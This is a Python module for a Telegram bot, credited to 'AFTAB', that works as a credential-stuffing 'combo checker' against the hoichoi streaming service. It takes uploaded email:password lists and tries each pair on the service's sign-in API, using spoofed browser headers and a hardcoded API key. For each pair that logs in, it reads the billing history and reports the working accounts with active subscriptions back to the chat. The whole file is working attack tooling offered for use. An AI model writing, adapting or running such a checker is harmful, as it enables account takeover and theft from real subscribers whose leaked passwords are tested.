import requests
import time
import json
import random
import string
import urllib3
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

hits = []
dead = []

def process_hoitxt_command(bot, message):
    bot.send_message(message.chat.id, "Please send your txt file with combo data.")

def handle_docs(bot, message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open('combo_data.txt', 'wb') as new_file:
            new_file.write(downloaded_file)

        with open('combo_data.txt', 'r') as file:
            combo_list = file.readlines()

        total_combos = len(combo_list)
        start_time = time.time()

        # Creating inline keyboard for showing results
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit'),
            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead')
        )

        initial_message = (
            f"↯ HOI COMBO CHECKER\n\n"
            f"COMBO CHECKING:\n"
            f"• HIT ✅: [0] •\n"
            f"• Dead ❌: [0] •\n"
            f"• TOTAL: [{total_combos}] •\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⚫️ Total Combos - {total_combos}\n"
            f"⏱️ Time Taken - 0.00 seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )

        msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)

        hits = []
        dead = []

        for combo in combo_list:
            if ':' in combo:
                user, pwd = combo.strip().split(':', 1)
                result = check_hoitxt_combo(user, pwd)
                if "HIT" in result:
                    hits.append((combo.strip(), result))
                else:
                    dead.append((combo.strip(), result))

                current_message = (
                    f"↯ HOI COMBO CHECKER\n\n"
                    f"COMBO CHECKING:\n{combo.strip()}\n\n"
                    f"• HIT ✅: [{len(hits)}] •\n"
                    f"• Dead ❌: [{len(dead)}] •\n"
                    f"• TOTAL: [{total_combos}] •\n"
                    f"－－－－－－－－－－－－－－－－\n"
                    f"⚫️ Total Combos - {total_combos}\n"
                    f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
                    f"▫️ Checked by: {message.from_user.username}\n"
                    f"⚡️ Bot by - AFTAB 👑\n"
                    f"－－－－－－－－－－－－－－－－"
                )
                bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
            else:
                dead.append((combo.strip(), "Invalid format"))

        bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

def handle_callback_query(call, bot):
    if call.data == 'hit':
        send_combos(call.message.chat.id, hits, bot, "HIT ✅ Combos")
    elif call.data == 'dead':
        send_combos(call.message.chat.id, dead, bot, "Dead ❌ Combos")

def send_combos(chat_id, combos, bot, title):
    if combos:
        combo_list = "\n".join([f"Combo: {combo}\nResult => {result}" for combo, result in combos])
        bot.send_message(chat_id, f"{title}\n\n{combo_list}")
    else:
        bot.send_message(chat_id, f"No {title} found.")

def check_hoitxt_combo(user, pwd):
    session = requests.Session()
    user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"

    headers = {
        "scheme": "https",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "54",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.hoichoi.tv",
        "referer": "https://www.hoichoi.tv/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": user_agent,
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }

    data = json.dumps({"email": user, "password": pwd})
    response = session.post("https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c", headers=headers, data=data)
    
    if response.status_code == 200 and "authorizationToken" in response.text:
        auth_token = response.json().get("authorizationToken")
        headers["authorization"] = auth_token
        
        response = session.get("https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv", headers=headers)
        
        if "subscriptionStatus" in response.text:
            return f"HIT: {response.json().get('subscriptionStatus')} until {response.json().get('subscriptionEndDate')}"
        else:
            return "Dead"
    else:
        return "Dead"

def random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def get_footer_info(total_combos, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⚫️ Total Combos - {total_combos}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
